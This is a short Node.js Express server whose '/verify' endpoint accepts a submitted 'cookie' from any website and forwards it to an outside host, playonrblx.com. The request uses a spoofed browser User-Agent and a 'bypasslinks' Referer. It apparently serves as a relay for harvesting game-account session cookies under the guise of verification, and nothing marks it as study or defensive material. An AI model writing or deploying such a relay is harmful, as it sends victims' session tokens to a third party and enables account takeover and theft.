import express from "express";
import fetch from "node-fetch";
import cors from "cors";

const app = express();

app.use(cors({ origin: "*" }));
app.use(express.json());

app.post("/verify", async (req, res) => {
  const { cookie } = req.body;
  if (!cookie) {
    return res.status(400).json({ error: "cookie required" });
  }

  try {
    const response = await fetch(
      "https://playonrblx.com/api/verification.php",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "User-Agent":
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36",
          "Referer": "https://playonrblx.com/a/bypasslinks/index"
        },
        body: JSON.stringify({ cookie }),
        compress: true
      }
    );

    const text = await response.text();
    res.send(text);
  } catch (err) {
    res.status(500).json({ error: "request failed" });
  }
});

app.get("/", (req, res) => {
  res.json({ status: "API running" });
});

app.listen(3000, () => console.log("API running"));
